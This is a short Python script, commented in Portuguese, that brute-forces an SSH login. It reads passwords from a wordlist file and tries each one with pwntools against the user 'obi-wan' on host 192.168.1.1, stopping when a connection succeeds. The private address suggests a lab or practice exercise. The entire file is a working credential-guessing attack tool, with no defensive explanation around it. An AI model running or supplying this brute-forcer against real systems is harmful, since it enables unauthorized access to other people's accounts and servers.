#!/bin/python3
# SSH Bruteforce

import paramiko.ssh_exception
from pwn import *
import paramiko

target = "192.168.1.1"
username = "obi-wan"
attempts = 0

with open("passes.txt", "r") as password_list:
    for i in password_list:
        password = i.strip("\n")

        try:
            print(f"\n[{attempts}] A tentar a password: {password}")

            # host: Máquina que vamos atacar
            # user: Username que vamos atacar
            # password: Password que vamos usar
            # timeout: tempo entre tentativas
            resposta = ssh(host=target, user=username, password=password, timeout=1)

            # Se conectar top
            if resposta.connected:
                print(f"Conexão com sucesso com a pass: {password}")
                resposta.close()
                break

        except paramiko.ssh_exception.AuthenticationException:
            print(f"Password Inválida, siga para a próxima")
        
        attempts += 1